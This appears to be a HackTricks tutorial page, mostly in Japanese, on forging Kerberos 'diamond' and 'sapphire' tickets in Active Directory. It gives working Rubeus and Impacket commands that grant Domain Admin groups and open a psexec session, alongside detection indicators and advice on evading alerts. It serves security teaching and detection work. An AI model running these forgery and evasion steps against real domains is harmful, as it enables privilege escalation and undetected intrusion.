# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Like a golden ticket**, diamond ticket は任意のユーザーとして任意のサービスに**アクセスできる**TGTです。golden ticket は完全にオフラインで偽造され、そのドメインの krbtgt ハッシュで暗号化されてからログオンセッションに注入されます。ドメインコントローラーは自分（または正当に発行したもの）の TGT を追跡していないため、自ドメインの krbtgt ハッシュで暗号化された TGT を問題なく受け入れます。

検出のための一般的な手法は次の通りです:

- 対応する AS-REQ がない TGS-REQ を探す。
- Mimikatz のデフォルトである 10 年の有効期間など、不自然な値を持つ TGT を探す。

A **diamond ticket** は **DC によって発行された正当な TGT のフィールドを修正することによって作成されます**。これは、**TGT を要求し**、ドメインの krbtgt ハッシュでそれを**復号し**、チケットの必要なフィールドを**修正し**、その後**再暗号化する**ことで実現されます。これにより、前述の golden ticket の2つの欠点が解消されます。理由は以下の通りです:

- TGS-REQ は先行する AS-REQ を持つ。
- TGT は DC によって発行されるため、ドメインの Kerberos ポリシーに基づく正しい詳細をすべて含んでいます。これらは golden ticket でも正確に偽造可能ですが、より複雑でミスが起きやすいです。

### 要件とワークフロー

- **Cryptographic material**: TGT を復号・再署名するための krbtgt の AES256 キー（推奨）または NTLM ハッシュ。
- **Legitimate TGT blob**: `/tgtdeleg`、`asktgt`、`s4u` で取得するか、メモリからチケットをエクスポートして入手。
- **Context data**: 対象ユーザーの RID、グループの RIDs/SIDs、および（任意で）LDAP 由来の PAC 属性。
- **Service keys**（サービスチケットを再発行する場合のみ）: 代行するサービス SPN の AES キー。

1. AS-REQ を介して制御下にある任意のユーザーの TGT を取得する（Rubeus の `/tgtdeleg` は、クライアントに資格情報なしで Kerberos GSS-API のやり取りを強制させるため便利）。
2. 返却された TGT を krbtgt キーで復号し、PAC 属性（ユーザー、グループ、ログオン情報、SIDs、デバイスクレームなど）をパッチする。
3. 同じ krbtgt キーでチケットを再暗号化／署名し、現在のログオンセッションに注入する（`kerberos::ptt`、`Rubeus.exe ptt`…）。
4. 任意で、有線上の痕跡を減らすために、有効な TGT blob と対象サービスキーを供給してサービスチケットに対して同じ処理を行う。

### 更新された Rubeus の運用（2024+）

Huntress による最近の改良で、Rubeus 内の `diamond` アクションが、以前は golden/silver tickets のみで存在していた `/ldap` と `/opsec` の改善を取り込んで近代化されました。`/ldap` は現在 AD から正確な PAC 属性（ユーザープロファイル、ログオン時間、sidHistory、ドメインポリシー等）を自動補完し、`/opsec` は二段階の事前認証シーケンスを実行して AES のみの暗号を強制することで AS-REQ/AS-REP のフローを Windows クライアントと見分けがつかないものにします。これにより、空のデバイス ID や現実味のない有効期間などの明白な痕跡が大幅に減少します。
```powershell
# Query RID/context data (PowerView/SharpView/AD modules all work)
Get-DomainUser -Identity <username> -Properties objectsid | Select-Object samaccountname,objectsid

# Craft a high-fidelity diamond TGT and inject it
./Rubeus.exe diamond /tgtdeleg \
/ticketuser:svc_sql /ticketuserid:1109 \
/groups:512,519 \
/krbkey:<KRBTGT_AES256_KEY> \
/ldap /ldapuser:MARVEL\loki /ldappassword:Mischief$ \
/opsec /nowrap
```
- `/ldap` (with optional `/ldapuser` & `/ldappassword`) は AD と SYSVOL を問い合わせてターゲットユーザーの PAC policy data をミラーします。
- `/opsec` は Windows ライクな AS-REQ リトライを強制し、ノイズの多いフラグをゼロにして AES256 に固執します。
- `/tgtdeleg` は被害者の平文パスワードや NTLM/AES キーには触れずに、復号可能な TGT を返します。

### Service-ticket recutting

同じ Rubeus の更新で、TGS blobs に対して diamond technique を適用する機能が追加されました。`diamond` に **base64-encoded TGT**（`asktgt`、`/tgtdeleg`、または以前に偽造した TGT から）、**service SPN**、および **service AES key** を与えることで、KDC に触れずに現実的な service tickets を発行できます — 実質的によりステルスな silver ticket。
```powershell
./Rubeus.exe diamond \
/ticket:<BASE64_TGT_OR_KRB-CRED> \
/service:cifs/dc01.lab.local \
/servicekey:<AES256_SERVICE_KEY> \
/ticketuser:svc_sql /ticketuserid:1109 \
/ldap /opsec /nowrap
```
This workflow is ideal when you already control a service account key (e.g., dumped with `lsadump::lsa /inject` or `secretsdump.py`) and want to cut a one-off TGS that perfectly matches AD policy, timelines, and PAC data without issuing any new AS/TGS traffic.

### Sapphire-style PAC swaps (2025)

最近の変種（**sapphire ticket** と呼ばれることがある）は、Diamond の "real TGT" ベースに **S4U2self+U2U** を組み合わせ、権限の高いユーザーの PAC を奪って自分の TGT に挿入します。余分な SID を捏造する代わりに、高権限ユーザーの U2U S4U2self チケットを要求してその PAC を抽出し、krbtgt キーで再署名する前に正当な TGT に継ぎ合わせます。U2U が `ENC-TKT-IN-SKEY` を設定するため、ワイヤ上のやり取りは正規のユーザー間交換に見えます。

最小限の Linux 側再現例 — Impacket のパッチ済み `ticketer.py`（sapphire サポートを追加）:
```bash
python3 ticketer.py -request -impersonate 'DAuser' \
-domain 'lab.local' -user 'lowpriv' -password 'Passw0rd!' \
-aesKey '<krbtgt_aes256>' -domain-sid 'S-1-5-21-111-222-333' \
--u2u --s4u2self
# inject resulting .ccache
export KRB5CCNAME=lowpriv.ccache
python3 psexec.py lab.local/DAuser@dc.lab.local -k -no-pass
```
Key OPSEC tells when using this variant:

- TGS-REQ will carry `ENC-TKT-IN-SKEY` and `additional-tickets` (the victim TGT) — rare in normal traffic.
- `sname` often equals the requesting user (self-service access) and Event ID 4769 shows the caller and target as the same SPN/user.
- Expect paired 4768/4769 entries with the same client computer but different CNAMES (low-priv requester vs. privileged PAC owner).

### OPSEC & detection notes

- 従来のハンター向けヒューリスティクス（AS なしの TGS、十年単位のライフタイム）は golden tickets にも当てはまるが、diamond tickets は主に **PAC 内容やグループマッピングがあり得ない** 場合に表面化する。自動比較で偽造が即座に検知されないよう、すべての PAC フィールド（logon hours、user profile paths、device IDs）を埋めておくこと。
- **グループ/RID を過剰に割り当てないこと**。必要なのが `512`（Domain Admins）と `519`（Enterprise Admins）のみであればそこで止め、ターゲットアカウントが AD 内の他所でそれらのグループに属していることがもっともらしく見えるようにする。過剰な `ExtraSids` は露見の原因。
- Sapphire-style スワップは U2U の指紋を残す：`ENC-TKT-IN-SKEY` + `additional-tickets` + 4769 の `sname == cname`、および偽造チケットに由来する追跡の 4624 ログオン。AS-REQ の欠落だけを見るのではなく、これらのフィールドを相関させること。
- Microsoft は CVE-2026-20833 を受けて **RC4 service ticket issuance** の段階的廃止を開始している。KDC で AES のみの etypes を強制することはドメイン強化になり、diamond/sapphire ツール群とも整合する（/opsec は既に AES を強制している）。偽造 PAC に RC4 を混ぜるとますます目立つようになる。
- Splunk の Security Content プロジェクトは diamond tickets の攻撃レンジテレメトリや、異常な Event ID 4768/4769/4624 の連続や PAC グループの変更を相関させる *Windows Domain Admin Impersonation Indicator* などの検出を配布している。そのデータセットを再生する（または上記コマンドで自前生成する）ことで、T1558.001 に対する SOC のカバレッジを検証でき、回避すべき具体的なアラートロジックを得られる。

## References

- [Huntress – Recutting the Kerberos Diamond Ticket (2025)](https://www.huntress.com/blog/recutting-the-kerberos-diamond-ticket)
- [Splunk Security Content – Diamond Ticket attack data & detections (2023)](https://research.splunk.com/attack_data/be469518-9d2d-4ebb-b839-12683cd18a7c/)
- [Хабр – Теневая сторона драгоценностей: Diamond & Sapphire Ticket (2025)](https://habr.com/ru/articles/891620/)
- [Microsoft – RC4 service ticket enforcement for CVE-2026-20833](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
